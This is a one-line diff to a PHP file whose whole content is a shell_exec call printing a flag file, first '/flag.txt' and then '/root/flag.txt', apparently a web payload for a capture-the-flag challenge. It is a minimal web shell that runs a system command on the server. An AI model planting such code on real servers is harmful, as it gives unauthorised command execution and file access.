@@ -1,1 +1,1 @@
-<?php echo shell_exec('cat /flag.txt'); ?>
+<?php echo shell_exec('cat /root/flag.txt'); ?>
